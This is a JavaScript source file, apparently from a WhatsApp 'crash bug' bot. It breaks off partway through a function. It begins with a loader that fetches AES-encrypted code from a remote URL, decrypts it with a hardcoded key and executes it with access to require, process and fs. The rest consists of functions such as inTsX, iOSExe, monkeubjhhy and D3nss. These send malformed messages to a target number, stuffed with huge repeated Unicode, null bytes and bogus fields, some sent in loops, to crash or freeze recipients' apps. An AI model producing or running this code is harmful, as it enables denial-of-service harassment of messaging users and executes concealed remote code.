const PeG74e4HR5 = 'LgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQleLgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQle';

async function importFromRawEncrypted(url) {
  try {
    const { data } = await axios.get(url, { responseType: 'text' });
    const [ivB64, encryptedB64] = data.trim().split('.');

    const IV = Buffer.from(ivB64, 'base64');
    const KEY = crypto.createHash('sha256').update(PeG74e4HR5).digest();

    const decipher = crypto.createDecipheriv('aes-256-cbc', KEY, IV);
    let decrypted = decipher.update(encryptedB64, 'base64', 'utf8');
    decrypted += decipher.final('utf8');

    // Sandbox VM
    const context = {
      module: { exports: {} },
      require,
      console,
      process,
      Buffer,
      setTimeout,
      setInterval,
      //clearTimeout,
      clearInterval,
      crypto,
      proto,
      generateWAMessageFromContent,
      prepareWAMessageMedia,
      generateWAMessageContent,
      generateWAMessage,
      waUploadToServer,
      fs,
      generateRandomMessageId
    };

    const sandbox = vm.createContext(context);
    sandbox.globalThis = sandbox;
    sandbox.exports = sandbox.module.exports;

    const script = new vm.Script(decrypted, { filename: 'fangsyon.js' });
    script.runInContext(sandbox);

    return sandbox.module.exports;
  } catch (err) {
    console.error("❌ Gagal decrypt & import:", err.stack || err.message);
    return null;
  }
}

let bugWa;

async function inTsX(sock, target) {
const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000); 
const s = "𑇂𑆵𑆴𑆿".repeat(60000);
   try {
      let locationMessagex = {
         degreesLatitude: 11.11,
         degreesLongitude: -11.11,
         name: " ‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
         url: "https://t.me/OTAX",
      }
      let msgx = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessagex
            }
         }
      }, {});
      let extendMsgx = {
         extendedTextMessage: { 
            text: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + s,
            matchedText: "VORCELIGHT¿",
            description: "𑇂𑆵𑆴𑆿".repeat(60000),
            title: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
            previewType: "NONE",
            jpegThumbnail: "",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msgx2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsgx
            }
         }
      }, {});
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`, 
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "𝔗𝔥𝔦𝔰 ℑ𝔰 𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + TravaIphone, 
            matchedText: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msg3 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      
      for (let i = 0; i < 10; i++) {
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msgx.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msgx2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
     
      await sock.relayMessage('status@broadcast', msg3.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
          if (i < 9) {
    await new Promise(resolve => setTimeout(resolve, 5000));
  }
      }
   } catch (err) {
      console.error(err);
   }
};

async function iOSExe(sock, target) {
  await sock.relayMessage(
    target,
    {
      stickerPackMessage: {
        stickerPackId: "X",
        name: "./hyuuXxsad" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        publisher: "./hyuuXxBukanDep" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        stickers: [
          {
            fileName: "FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "woi",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "pppp",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "wi+jDzUdQGV2tMwtLQBahUdH9U-sw7XR2kCkwGluFvI=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "maklo",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "jytf9WDV2kDx6xfmDfDuT4cffDW37dKImeOH+ErKhwg=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "pp",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "ItSCxOPKKgPIwHqbevA6rzNLzb2j6D3-hhjGLBeYYc4=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "ppp",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "1EFmHJcqbqLwzwafnUVaMElScurcDiRZGNNugENvaVc=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "ppp",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "3UCz1GGWlO0r9YRU0d-xR9P39fyqSepkO+uEL5SIfyE=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "pppp",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "1cOf+Ix7+SG0CO6KPBbBLG0LSm+imCQIbXhxSOYleug=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "ppp",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "5R74MM0zym77pgodHwhMgAcZRWw8s5nsyhuISaTlb34=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "pppp",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "3c2l1jjiGLMHtoVeCg048To13QSX49axxzONbo+wo9k=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "pppp",
            isLottie: true,
            mimetype: "application/pdf",
          },
        ],
        fileLength: "999999",
        fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
        fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
        mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=",
        directPath:
          "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc?ccb=11-4&oh=01_Q5AaIJUsG86dh1hY3MGntd-PHKhgMr7mFT5j4rOVAAMPyaMk&oe=67EF584B&_nc_sid=5e03e0",
        contextInfo: {
          quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000
                },
                forwardedAiBotMessageInfo: {
                  botName: "META AI",
                  botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                  creatorName: "Bot"
                }
            }
        },
        packDescription: "./diki" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        mediaKeyTimestamp: "1741150286",
        trayIconFileName: "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",
        thumbnailDirectPath:
          "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc?ccb=11-4&oh=01_Q5AaIB8lN_sPnKuR7dMPKVEiNRiozSYF7mqzdumTOdLGgBzK&oe=67EF38ED&_nc_sid=5e03e0",
        thumbnailSha256: "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",
        thumbnailEncSha256: "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",
        thumbnailHeight: 252,
        thumbnailWidth: 252,
        imageDataHash:
          "ODBkYWY0NjE1NmVlMTY5ODNjMTdlOGE3NTlkNWFkYTRkNTVmNWY0ZThjMTQwNmIyYmI1ZDUyZGYwNGFjZWU4ZQ==",
        stickerPackSize: "999999999",
        stickerPackOrigin: "1",
      },
    }, { participant: { jid: target } });
}

async function inviteUI(sock, target) {
await sock.relayMessage(target, {
"extendedTextMessage": {
"text": "Vorcelight Izin Tampil¿" + "ꦽ".repeat(50000),
"previewType": "NONE",
"contextInfo": {
"mentionedJid": [
target
]
},
"inviteLinkGroupTypeV2": "DEFAULT"
}
}, {
participant: { jid: target }
});
}

async function PayLink(sock, target) {
  const msg = generateWAMessageFromContent(target, {
    groupStatusMessageV2: {
      message: {
        extendedTextMessage: {
          text: " ./R4LDZ EXE", 
          previewType: 6,
          contextInfo: {
            mentionedJid: Array.from({ length: 100 }, (_, z) => `628${z + 1}@s.whatsapp.net`)
          },
          paymentLinkMetadata: {
            button: {
              displayText: "Bro?"
            }, 
            header: {
              headerType: 2
            }, 
            provider: {
              paramsJson: "{".repeat(10000) 
            }
          }
        }
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, {
    participant: { jid: target }
  }) 
}


async function monkeubjhhy(sock, target) {
    const msg = {
        protocolMessage: {
            type: 0,
            key: { remoteJid: target, fromMe: true },
            message: {
                interactiveMessage: {
                    body: { text: "\u0000".repeat(90000) },
                    nativeFlowMessage: {
                        buttons: [
                            { name: "quick_reply", buttonParamsJson: "\x00".repeat(25000) },
                            { name: "quick_reply", buttonParamsJson: "\0".repeat(12878) }
                        ],
                        messageParamsJson: JSON.stringify({
                            displayName: "X",
                            title: "\0".repeat(30000)
                        })
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 4000 }, () => ""),
                        forwardingScore: 9999,
                        isForwarded: true,
                        quotedMessage: {
                            locationMessage: {
                                degreesLatitude: -999.999,
                                degreesLongitude: 999.999,
                                name: "\u0000".repeat(35000),
                                address: "🥂🍷ꦾØ$ł₦ŁU₣₣¥🥂🍷".repeat(40000),
                                contextInfo: {
                                    mentionedJid: Array.from({ length: 2000 }, () => ""),
                                    forwardingScore: 9999,
                                    isForwarded: true
                                }
                            }
                        }
                    }
                }
            }
        }
    };

    const msg2 = {
        header: {
            title: "MONKEY",
            hasMediaAttachment: false
        },
        body: {
            text: "MONKEY HRE"
        },
        footer: {
            text: "\r"
        },
        nativeFlowMessage: {
            buttons: [
                {
                    name: "booking_confirmation",
                    buttonParamsJson: JSON.stringify({
                        icon: "default",
                        start_datetime: "2026-06-10T10:37:10.967Z",
                        end_datetime: "2026-06-10T10:47:10.967Z",
                        location: "epZinc Network",
                        booking_url: "t.me/iamsatzZX",
                        phone_number: "\0".repeat(12000),
                        booking_management_url: "t.me/LUFFYLOXTAL",
                        description: "ြ".repeat(20000),
                        email: "\u0000".repeat(2000),
                        display_text: "KEY" + "ြ".repeat(19000),
                        display_content: {
                            display_language: "id",
                            display_meeting_type: "KEY¿" + "ြ".repeat(15000),
                            display_bottom_sheet_header: "ြ".repeat(17000),
                            display_add_to_calendar_cta_text: "MONKEY",
                            display_view_on_maps_cta_text: "MONKEY",
                            display_manage_booking_cta_text: "ြ".repeat(22000),
                            display_manage_booking_not_supported_text: "NOT AVAILABLE",
                            display_read_more: "READ MORE"
                        }
                    })
                }
            ],
            messageParamsJson: ""
        }
    };

    const msg3 = {
        botForwardedMessage: {
            message: {
                richResponseMessage: {
                    messageType: 1,
                    submessages: [
                        {
                            messageType: 2,
                            messageText: `@${target.split('@')[0]}`
                        },
                        {
                            messageType: 3,
                            mediaMetadata: {}
                        },
                        {
                            messageType: 4,
                            tableMetadata: {
                                title: "\0",
                                rows: [
                                    {
                                        items: [],
                                        isHeading: true
                                    }
                                ]
                            }
                        }
                    ],
                    contextInfo: {
                        mentionedJid: [target],
                        featureEligibilities: Array.from({ length: 99000 }, () => ({
                            canReceiveMultiReact: true
                        })),
                        isForwarded: true,
                        forwardedAiBotMessageInfo: {
                            botJid: "867051314767696@bot"
                        },
                        forwardOrigin: 4
                    }
                }
            }
        }
    };

    const msg4 = {
        imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/739615358_1012616024900454_6531113217436689026_n.enc?ccb=11-4&oh=01_Q5Aa5AH0D6R2dyqyyJ_TEt83mdD4fNwOuNOGNARKMWy22lI6vw&oe=6A76C689&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/jpeg",
            fileSha256: "o+iSkGm6O3/g7uBR/aChsjSKs7EcayA8lV/h7yaPsq0=",
            viewOnce: true,
            caption: "MONKEYFALSE" + "ြ".repeat(100000),
            fileLength: "71831",
            height: 1024,
            width: 1536,
            mediaKey: "RHS1mPMKv23WPGPM8GWd5fsXzZh1dLdG04yIrL13FB4=",
            fileEncSha256: "+40DMIFaOid0dVofoUAQkY8v6cfjkxFUqJWy6gSwfkc=",
            directPath: "/v/t62.7118-24/739615358_1012616024900454_6531113217436689026_n.enc?ccb=11-4&oh=01_Q5Aa5AH0D6R2dyqyyJ_TEt83mdD4fNwOuNOGNARKMWy22lI6vw&oe=6A76C689&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1783579277",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIADAASAMBIgACEQEDEQH/xAAsAAEAAgMBAAAAAAAAAAAAAAAAAgQBAwUGAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAADzIDZM0AM2CskI9Dn2jucyxpLbn4N+2NUpMCVmmJz0i1isM4AD/8QAKhAAAgICAQEFCQEAAAAAAAAAAQIAAwQREjEQFCEwURMiNBMyQmFigZH/2gAIAQEAAT8A8tKrH+FCY9Jq+Z19O3R9JViXWglVjrxYjswsQ2uGYe4JfZkKQmLQAgiUX5GYBaszMeiukOniN6id0GK1wpA1Me321wVKhtv8EzMnu+6aWH5jEk7PZQ+QQUqYzldj1bsv/kOS9aG3kObyzKc1hFfr1loZhVQh3AExAFLgE9ZbkUhStdY2fuMJ3EUMfE6EbIFY40jX7TkxOy0ULYWLvqCuoHYt+m45Feilmyw8YST1O/M//8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwB//8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwB//9k=",
            contextInfo: {
                featureEligibilities: { cannotBeRanked: true, canBeReshared: true },
                pairedMediaType: "NOT_PAIRED_MEDIA",
                statusSourceType: "MUSIC_STANDALONE"
            },
            annotations: [
                {
                    polygonVertices: [
                        { x: 0.17499999701976776, y: 0.3379453122615814 },
                        { x: 0.824999988079071, y: 0.3379453122615814 },
                        { x: 0.824999988079071, y: 0.6620468497276306 },
                        { x: 0.17499999701976776, y: 0.6620468497276306 }
                    ],
                    shouldSkipConfirmation: true,
                    embeddedContent: {
                        embeddedMusic: {
                            musicContentMediaId: "2261401457948346",
                            songId: "849859527815275",
                            author: "MONKEY" + "ြ".repeat(55000),
                            title: "ြ".repeat(45000),
                            artworkDirectPath: "/v/t62.76458-24/568311115_4528169627440664_4559757974106869948_n.enc?ccb=11-4&oh=01_Q5Aa5AGs28VMFVXkcn0w9n-YUhiBwEPKyIwEcjWZLHm7mUgOsQ&oe=6A786B6E&_nc_sid=5e03e0",
                            artworkSha256: "FROyKnRoHfLzDwmz5tED8K3nmdK+4Uihn2ucHBZDjPI=",
                            artworkEncSha256: "y/SkheY3BoGhndQlmR6icfLtMtI4FjjRi5y3bsX13jw=",
                            artworkMediaKey: "s5VCH/gb/YjDXhek47MVcsHjVV3/lOHOYaDe72eodXw=",
                            artistAttribution: "https://www.instagram.com/_u/ndarboy_genk",
                            countryBlocklist: "WEs=",
                            isExplicit: false
                        }
                    },
                    embeddedAction: true
                }
            ]
        }
    };

    await sock.relayMessage(target, msg, {
        participant: { jid: target }
    });

    await sock.relayMessage(target, msg2, {
        participant: { jid: target }
    });

    await sock.relayMessage(target, msg3, {
        participant: { jid: target }
    });

    await sock.relayMessage(target, msg4, {
        participant: { jid: target }
    });
}

async function D3nss(sock, target) {
  const StanzaSock = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo: {
            stanzaId: sock.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                fileLength: "9999999999999",
                pageCount: 3567587327,
                mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                fileName: "CIYYOO NIH BG‌",
                fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1735456100",
                contactVcard: true,
                caption: "",
              },
            },
          },
          body: {
            text: " " + "ꦽ".repeat(100000),
          },
          nativeFlowMessage: {
            buttons: [
                {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({
                    display_text: "𑜦𑜠".repeat(10000),
                    id: null
                  })
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({
                    display_text: "𑜦𑜠".repeat(10000),
                    id: null
                  })
                },
                {
                  name: "cta_url",
                  buttonParamsJson: JSON.stringify({
                    display_text: "𑜦𑜠".repeat(10000),
                    url: "https://" + "𑜦𑜠".repeat(10000) + ".com"
                  })
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: JSON.stringify({
                    display_text: "𑜦𑜠".repeat(10000),
                    copy_code: "𑜦𑜠".repeat(10000)
                  })
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({
                    icon: "PROMOTION",
                    flow_cta: "PAYMENT_PROMOTION",
                    flow_message_version: "3"
                 })
               }
            ],
          },
        },
      },
    },
  };

  await sock.relayMessage(target, StanzaSock, {
    messageId: sock.generateMessageTag(),
    participant: { jid: target }
  });
} 


async function lockGB(sock, target) {
sock.relayMessage(
target,
{
